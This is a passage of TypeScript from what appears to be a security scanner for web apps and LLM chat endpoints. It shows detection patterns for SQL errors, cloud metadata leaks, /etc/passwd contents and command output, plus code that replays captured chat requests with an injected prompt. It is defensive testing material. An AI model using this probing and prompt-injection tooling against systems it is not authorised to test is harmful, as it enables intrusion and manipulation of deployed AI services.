    /warning.*pg_/i,
    /valid postgresql result/i,
    /nativeclient.*microsoft.*sql/i,
    /odbc sql server driver/i,
    /sqlserver.*jdbc/i,
    /(?:oracle.*driver.*error|error.*oracle.*driver)/i,
    /ora-\d{5}(?!\s*<)/i,
    /quoted string not properly terminated/i,
    /sql command not properly ended/i,
    /microsoft access driver/i,
    /jetcdbengine/i,
    /sqlite.*error/i,
    /sqlite3::/i,
  ];

  const isPhpInfo = response.body.includes("<title>phpinfo()</title>") || response.body.includes("<h1>PHP Credits</h1>");

  if (!isPhpInfo) {
    for (const pattern of sqlErrorPatterns) {
      const match = pattern.exec(response.body);
      if (match) {
        return {
          detected: true,
          severity: "critical",
          evidence: `SQL error message detected: ${match[0]}`,
          confirmed: true,
        };
      }
    }
  }

  if (baseline.status === 200 && response.status >= 400 && response.status < 500) {
    return { detected: false, severity: "info", evidence: "", confirmed: false };
  }

  if (baseline.status > 0 && response.status !== baseline.status) {
    return {
      detected: true,
      severity: "medium",
      evidence: `Response status differs from baseline (${response.status} vs ${baseline.status})`,
      confirmed: false,
    };
  }

  if (baseline.bodyLength > 0 && Math.abs(response.body.length - baseline.bodyLength) > baseline.bodyLength * 0.5) {
    return {
      detected: true,
      severity: "low",
      evidence: `Response length significantly different from baseline (${response.body.length} vs ${baseline.bodyLength})`,
      confirmed: false,
    };
  }

  if (response.latencyMs >= 4500 && payload.value.includes("WAITFOR")) {
    return {
      detected: true,
      severity: "high",
      evidence: `Time-based SQL injection detected (response took ${response.latencyMs}ms)`,
      confirmed: true,
    };
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectSsrf(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const metadataPatterns = [
    /ami-id/i,
    /instance-id/i,
    /computeMetadata/i,
    /iam security credentials/i,
    /instance-identity/i,
  ];

  for (const pattern of metadataPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "critical",
        evidence: `Cloud metadata content detected: ${match[0]}`,
        confirmed: true,
      };
    }
  }

  if (baseline.status === 0 && response.status > 0 && response.status < 400) {
    return {
      detected: true,
      severity: "high",
      evidence: `Internal service responded (status ${response.status}) when baseline was unreachable`,
      confirmed: false,
    };
  }

  if (response.status >= 200 && response.status < 300 && baseline.status !== response.status) {
    return {
      detected: true,
      severity: "medium",
      evidence: `Different response from internal endpoint (${response.status} vs baseline ${baseline.status})`,
      confirmed: false,
    };
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectPathTraversal(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const fileContentPatterns = [
    /root:x:0:0/,
    /\[boot loader\]/i,
    /nfsnobody:x:/,
    /\/bin\/bash/,
    /\/bin\/sh/,
  ];

  for (const pattern of fileContentPatterns) {
    const match = pattern.exec(response.body);
    if (match && !pattern.exec(baseline.body)) {
      return {
        detected: true,
        severity: "critical",
        evidence: `File content detected in response: ${match[0]}`,
        confirmed: true,
      };
    }
  }

  if (response.status !== baseline.status && response.body.length !== baseline.bodyLength) {
    return {
      detected: true,
      severity: "medium",
      evidence: `Response differs from baseline (status ${response.status} vs ${baseline.status})`,
      confirmed: false,
    };
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectCmdi(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const passwdPatterns = [/root:x:0:0/, /bin:x:\d+:\d+/, /daemon:x:\d+:\d+/];
  for (const pattern of passwdPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "critical",
        evidence: `/etc/passwd content detected in response: ${match[0]}`,
        confirmed: true,
      };
    }
  }

  const cmdOutputPatterns = [/uid=\d+/, /gid=\d+/, /groups=\d+/];
  for (const pattern of cmdOutputPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "critical",
        evidence: `Command output pattern detected in response: ${match[0]}`,
        confirmed: true,
      };
    }
  }

  if (baseline.status > 0 && response.status !== baseline.status) {
    return {
      detected: true,
      severity: "medium",
      evidence: `Response status differs from baseline (${response.status} vs ${baseline.status})`,
      confirmed: false,
    };
  }

  if (baseline.bodyLength > 0 && Math.abs(response.body.length - baseline.bodyLength) > baseline.bodyLength * 0.5) {
    return {
      detected: true,
      severity: "low",
      evidence: `Response length significantly different from baseline (${response.body.length} vs ${baseline.bodyLength})`,
      confirmed: false,
    };
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectFileUpload(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  if (response.body.includes("VULN_UPLOAD_TEST")) {
    return {
      detected: true,
      severity: "critical",
      evidence: `Uploaded file executed on server, VULN_UPLOAD_TEST marker found in response`,
      confirmed: true,
    };
  }

  if (response.status === 200 || response.status === 201 || response.status === 204) {
    const lowerBody = response.body.toLowerCase();
    const uploadIndicators = ["uploaded", "success", "file saved", "上传成功"];
    for (const indicator of uploadIndicators) {
      if (lowerBody.includes(indicator)) {
        return {
          detected: true,
          severity: "high",
          evidence: `Upload accepted by server (status ${response.status}), response contains "${indicator}"`,
          confirmed: false,
        };
      }
    }

    return {
      detected: true,
      severity: "medium",
      evidence: `Upload endpoint accepted request (status ${response.status})`,
      confirmed: false,
    };
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function detectDeserialization(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
  const passwdPatterns = [/root:x:0:0/, /bin:x:\d+:\d+/, /daemon:x:\d+:\d+/];
  for (const pattern of passwdPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "critical",
        evidence: `/etc/passwd content detected in response: ${match[0]}`,
        confirmed: true,
      };
    }
  }

  const javaErrorPatterns = [/java\.lang/, /ClassNotFoundException/, /InvocationTargetException/];
  for (const pattern of javaErrorPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "high",
        evidence: `Java deserialization error exposed: ${match[0]}`,
        confirmed: false,
      };
    }
  }

  const phpErrorPatterns = [/__sleep/, /__wakeup/, /unserialize/];
  for (const pattern of phpErrorPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "high",
        evidence: `PHP deserialization error exposed: ${match[0]}`,
        confirmed: false,
      };
    }
  }

  const pythonErrorPatterns = [/pickle/, /UnpicklingError/];
  for (const pattern of pythonErrorPatterns) {
    const match = pattern.exec(response.body);
    if (match) {
      return {
        detected: true,
        severity: "high",
        evidence: `Python deserialization error exposed: ${match[0]}`,
        confirmed: false,
      };
    }
  }

  if (response.status === 500) {
    const deserializationKeywords = [/deserializ/i, /unmarshal/i, /readObject/i, /fromstring/i];
    for (const pattern of deserializationKeywords) {
      const match = pattern.exec(response.body);
      if (match) {
        return {
          detected: true,
          severity: "medium",
          evidence: `500 error with deserialization-related message: ${match[0]}`,
          confirmed: false,
        };
      }
    }
  }

  return { detected: false, severity: "info", evidence: "", confirmed: false };
}

function buildVulnReproCurl(request: VulnProbeRequest): string {
  const safeHeaders = sanitizeReproHeaders(request.headers);
  const headerFlags = Object.entries(safeHeaders).flatMap(([key, value]) => [
    "-H",
    shellEscape(`${key}: ${value}`),
  ]);

  const parts = [
    "curl",
    "-sS",
    "-X",
    shellEscape(request.method),
    shellEscape(request.url),
    ...headerFlags,
  ];

  if (request.body) {
    parts.push("--data", shellEscape(request.body));
  }

  return parts.join(" ");
}

function normalizeWebVulnScanConfigPaths(
  config: WebVulnScanConfig,
  filePath: string,
): WebVulnScanConfig {
  const configDir = dirname(filePath);
  return {
    ...config,
    harPath: resolve(configDir, config.harPath),
  };
}

function isWebVulnScanConfig(value: unknown): value is WebVulnScanConfig {
  if (!isRecord(value)) {
    return false;
  }

  const validTypes = new Set(["xxe", "xss", "sqli", "ssrf", "path-traversal", "cmdi", "file-upload", "deserialization"]);
  const vulns = (value as any).vulns;

  return (
    typeof (value as any).id === "string" &&
    typeof (value as any).target === "string" &&
    typeof (value as any).harPath === "string" &&
    Array.isArray(vulns) &&
    vulns.every((item: any) =>
      isRecord(item) &&
      typeof item.type === "string" &&
      validTypes.has(item.type) &&
      (item.enabled === undefined || typeof item.enabled === "boolean")
    )
  );
}

async function loadSteps(filePath: string): Promise<WebStep[]> {
  const content = await readFile(filePath, "utf8");
  const parsed = JSON.parse(content) as unknown;
  if (!Array.isArray(parsed)) {
    throw new Error("Invalid steps file");
  }
  return parsed as WebStep[];
}

async function runSteps(page: Page, steps: WebStep[]): Promise<void> {
  for (const step of steps) {
    await runStep(page, step);
  }
}

async function runStep(page: Page, step: WebStep): Promise<void> {
  if (step.action === "goto") {
    await page.goto(step.url, { waitUntil: "domcontentloaded" });
    return;
  }

  if (step.action === "click") {
    await page.click(step.selector);
    return;
  }

  if (step.action === "type") {
    const value = interpolateEnv(step.text);
    if (step.clear) {
      await page.fill(step.selector, value);
      return;
    }
    await page.type(step.selector, value);
    return;
  }

  if (step.action === "press") {
    await page.press(step.selector, step.key);
    return;
  }

  if (step.action === "wait") {
    await page.waitForTimeout(step.ms);
    return;
  }

  if (step.action === "waitForNavigation") {
    await page.waitForNavigation({ waitUntil: "domcontentloaded" });
    return;
  }

  if (step.action === "waitForSelector") {
    await page.waitForSelector(step.selector, {
      timeout: step.timeoutMs,
    });
    return;
  }

  const exhaustive: never = step;
  throw new Error(`Unsupported step: ${JSON.stringify(exhaustive)}`);
}

function interpolateEnv(value: string): string {
  return value.replace(/\$\{([A-Z0-9_]+)\}/g, (full, key: string) => {
    const resolved = process.env[key];
    return resolved === undefined ? full : resolved;
  });
}

function safeHost(url: string): string | undefined {
  try {
    return new URL(url).host;
  } catch {
    return undefined;
  }
}

function inferLlmEndpoint(url: string, request: any): string | undefined {
  if (url.includes("/v1/chat/completions") || url.includes("/chat/completions")) {
    return "openai-compatible path";
  }

  if (url.includes("/v1/completions")) {
    return "openai-compatible completions path";
  }

  if (url.includes("/api/chat") || url.includes("/api/v1/chat")) {
    return "common chat api path";
  }

  const contentType = getHeader(request?.headers, "content-type");
  if (contentType && contentType.includes("application/json")) {
    const text = request?.postData?.text;
    if (typeof text === "string") {
      try {
        const parsed = JSON.parse(text) as any;
        if (Array.isArray(parsed?.messages)) {
          return "openai-compatible request shape";
        }
        if (typeof parsed?.prompt === "string" || typeof parsed?.query === "string" || typeof parsed?.message === "string") {
          return "custom chat request shape";
        }
      } catch {
        return undefined;
      }
    }
  }

  return undefined;
}

function getHeader(
  headers: Array<{ name: string; value: string }> | undefined,
  name: string,
): string | undefined {
  if (!headers) {
    return undefined;
  }
  const key = name.toLowerCase();
  const header = headers.find((item) => String(item.name).toLowerCase() === key);
  return header ? String(header.value) : undefined;
}

function toSortedHostCounts(
  map: Map<string, number>,
): Array<{ host: string; count: number }> {
  return Array.from(map.entries())
    .map(([host, count]) => ({ host, count }))
    .sort((a, b) => b.count - a.count);
}

function toSortedMethodCounts(
  map: Map<string, number>,
): Array<{ method: string; count: number }> {
  return Array.from(map.entries())
    .map(([method, count]) => ({ method, count }))
    .sort((a, b) => b.count - a.count);
}

function dedupeCandidates(
  items: Array<{ url: string; reason: string }>,
): Array<{ url: string; reason: string }> {
  const seen = new Set<string>();
  const out: Array<{ url: string; reason: string }> = [];
  for (const item of items) {
    const key = `${item.url}::${item.reason}`;
    if (seen.has(key)) {
      continue;
    }
    seen.add(key);
    out.push(item);
  }
  return out;
}

async function readHar(harPath: string): Promise<any> {
  const content = await readFile(harPath, "utf8");
  return JSON.parse(content) as any;
}

type HarRequest = {
  method: string;
  url: string;
  headers: Array<{ name: string; value: string }>;
  postData?: { text?: string };
};

type LlmRequestTemplate = {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: Record<string, unknown>;
  model?: string;
};

function selectLlmRequestTemplate(
  har: any,
  urlContains?: string,
): LlmRequestTemplate | undefined {
  const entries: any[] = har?.log?.entries ?? [];

  for (const entry of entries) {
    const req = entry?.request as HarRequest | undefined;
    if (!req?.url || !req.method) {
      continue;
    }
    if (urlContains && !String(req.url).includes(urlContains)) {
      continue;
    }
    const reason = inferLlmEndpoint(String(req.url), req);
    if (!reason) {
      continue;
    }

    const body = parseJsonBody(req);
    if (!body) {
      continue;
    }

    const headers = normalizeHeaders(req.headers);
    return {
      method: String(req.method).toUpperCase(),
      url: String(req.url),
      headers,
      body,
      model: typeof (body as any).model === "string" ? (body as any).model : undefined,
    };
  }

  return undefined;
}

function parseJsonBody(req: HarRequest): Record<string, unknown> | undefined {
  const text = req.postData?.text;
  if (typeof text !== "string" || text.length === 0) {
    return undefined;
  }
  try {
    const parsed = JSON.parse(text) as unknown;
    return isRecord(parsed) ? (parsed as Record<string, unknown>) : undefined;
  } catch {
    return undefined;
  }
}

function normalizeHeaders(headers: Array<{ name: string; value: string }>): Record<string, string> {
  const disallowed = new Set([
    "host",
    "content-length",
    "connection",
    "accept-encoding",
  ]);

  const out: Record<string, string> = {};
  for (const header of headers) {
    const key = String(header.name).toLowerCase();
    if (disallowed.has(key)) {
      continue;
    }
    out[key] = String(header.value);
  }

  if (!out["content-type"]) {
    out["content-type"] = "application/json";
  }

  return out;
}

async function sendInjectedOpenAICompatibleRequest(
  template: LlmRequestTemplate,
  prompt: string,
  timeoutMs: number,
): Promise<ProviderGenerateResult> {
  const startedAt = Date.now();
  const body = injectPromptIntoOpenAICompatibleBody(template.body, prompt);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(template.url, {
      method: template.method,
      headers: template.headers,
      body: JSON.stringify(body),
      signal: controller.signal,
    });

    if (!response.ok) {
      return {
        ok: false,
        providerId: "web-har",
        providerType: "openai-compatible",
        model: template.model,
        latencyMs: Date.now() - startedAt,
        text: "",
        message: `HTTP ${response.status}`,
      };
    }

    const parsed = (await response.json()) as unknown;
    const text = readOpenAICompatibleText(parsed);
    if (!text) {
      return {
        ok: false,
        providerId: "web-har",
        providerType: "openai-compatible",
        model: template.model,
        latencyMs: Date.now() - startedAt,
        text: "",
        message: "Invalid OpenAI-compatible response",
      };
    }

    return {
      ok: true,
      providerId: "web-har",
      providerType: "openai-compatible",
      model: template.model,
      latencyMs: Date.now() - startedAt,
      text,
      message: "Generation completed",
    };
  } catch (error) {
    return {
      ok: false,
      providerId: "web-har",
      providerType: "openai-compatible",
      model: template.model,
      latencyMs: Date.now() - startedAt,
      text: "",
      message: error instanceof Error ? error.message : "Unknown request error",
    };
  } finally {
    clearTimeout(timer);
  }
}

function injectPromptIntoOpenAICompatibleBody(
  original: Record<string, unknown>,
  prompt: string,
): Record<string, unknown> {
  const cloned: Record<string, unknown> = { ...original };
  if (cloned.stream !== undefined) {
    cloned.stream = false;
  }

  if (Array.isArray((cloned as any).messages)) {
    const messages = [...((cloned as any).messages as any[])];
    const lastUserIndex = findLastUserMessageIndex(messages);
    if (lastUserIndex >= 0) {
      const msg = isRecord(messages[lastUserIndex]) ? { ...(messages[lastUserIndex] as any) } : {};
      msg.role = "user";
      msg.content = prompt;
      messages[lastUserIndex] = msg;
    } else {
      messages.push({ role: "user", content: prompt });
    }
    (cloned as any).messages = messages;
    return cloned;
  }

  if (typeof cloned.prompt === "string") {
    cloned.prompt = prompt;
    return cloned;
  }
  if (typeof cloned.query === "string") {
    cloned.query = prompt;
    return cloned;
  }
  if (typeof cloned.message === "string") {
    cloned.message = prompt;
    return cloned;
  }

  return cloned;
}

function buildReproCurl(template: LlmRequestTemplate, prompt: string): string {
  const body = injectPromptIntoOpenAICompatibleBody(template.body, prompt);
  const safeHeaders = sanitizeReproHeaders(template.headers);
  const headerFlags = Object.entries(safeHeaders).flatMap(([key, value]) => [
    "-H",
    shellEscape(`${key}: ${value}`),
  ]);

  return [
    "curl",
    "-sS",
    "-X",
    shellEscape(template.method),
    shellEscape(template.url),
    ...headerFlags,
    "--data",
    shellEscape(JSON.stringify(body)),
  ].join(" ");
}

function sanitizeReproHeaders(headers: Record<string, string>): Record<string, string> {
  const blocked = [
    "authorization",
    "cookie",
    "x-api-key",
    "api-key",
    "x-auth-token",
    "x-csrf-token",
  ];

  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(headers)) {
    const lower = key.toLowerCase();
    if (blocked.includes(lower) || lower.includes("token")) {
      continue;
    }
    out[lower] = value;
  }

  if (!out["content-type"]) {
    out["content-type"] = "application/json";
  }

  return out;
}

function shellEscape(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function findLastUserMessageIndex(messages: any[]): number {
  for (let index = messages.length - 1; index >= 0; index -= 1) {
    const msg = messages[index];
    if (isRecord(msg) && String((msg as any).role) === "user") {
      return index;
    }
  }
  return -1;
}

function readOpenAICompatibleText(body: unknown): string | undefined {
  if (!isRecord(body)) {
    return undefined;
  }

  if (Array.isArray((body as any).choices)) {
    for (const choice of (body as any).choices) {
      if (!isRecord(choice)) {
        continue;
      }
      if (typeof (choice as any).text === "string") {
        return (choice as any).text;
      }
      const message = (choice as any).message;
      if (isRecord(message) && typeof (message as any).content === "string") {
        return (message as any).content;
      }
    }
  }

  if (typeof (body as any).response === "string") {
    return (body as any).response;
  }
  if (typeof (body as any).answer === "string") {
    return (body as any).answer;
  }
  if (typeof (body as any).text === "string") {
    return (body as any).text;
  }
  if (typeof (body as any).message === "string") {
    return (body as any).message;
  }

  return undefined;
}

function normalizeJudgeConfig(config: ScanJudgeConfig): PluginJudgeConfig {
  if (isPluginJudgeConfig(config)) {
    return config;
  }

  if (!isLegacyJudgeConfig(config)) {
    return { plugin: "allow-all" };
  }

  if (config.mode === "allow-all") {
    return { plugin: "allow-all" };
  }

  return {
    plugin: "keyword",
    params: {
      failOnKeywords: config.failOnKeywords,
    },
  };
}

async function loadOptionalBridgeRegistry(config: WebScanConfig) {
  if (!config.bridge || config.bridge.manifestPaths.length === 0) {
    return {
      manifests: [],
      attackRegistry: new Map(),
      judgeRegistry: new Map(),
    };
  }

  return loadBridgeRegistry(config.bridge.manifestPaths);
}

function normalizeWebScanConfigPaths(
  config: WebScanConfig,
  filePath: string,
): WebScanConfig {
  const configDir = dirname(filePath);
  const normalizedBridge = config.bridge
    ? {
        manifestPaths: config.bridge.manifestPaths.map((entry) =>
          resolve(configDir, entry),
        ),
      }
    : undefined;

  return {
    ...config,
    harPath: resolve(configDir, config.harPath),
    bridge: normalizedBridge,
  };
}

function isWebScanConfig(value: unknown): value is WebScanConfig {
  if (!isRecord(value)) {
    return false;
  }

  const candidate = (value as any).candidate;
  const candidateOk =
    candidate === undefined ||
    (isRecord(candidate) &&
      ((candidate as any).urlContains === undefined ||
        typeof (candidate as any).urlContains === "string"));

  const bridge = (value as any).bridge;
  const bridgeOk =
    bridge === undefined ||
    (isRecord(bridge) &&
      Array.isArray((bridge as any).manifestPaths) &&
      (bridge as any).manifestPaths.every((item: any) => typeof item === "string"));

  return (
    typeof (value as any).id === "string" &&
    typeof (value as any).target === "string" &&
    typeof (value as any).harPath === "string" &&
    candidateOk &&
    bridgeOk &&
    Array.isArray((value as any).attacks) &&
    (value as any).attacks.every((item: unknown) => isScanAttackCase(item) || isRegisteredAttackConfig(item)) &&
    ((value as any).judge !== undefined)
  );
}

function isRecord(value: unknown): value is Record<string, any> {
  return typeof value === "object" && value !== null;
}
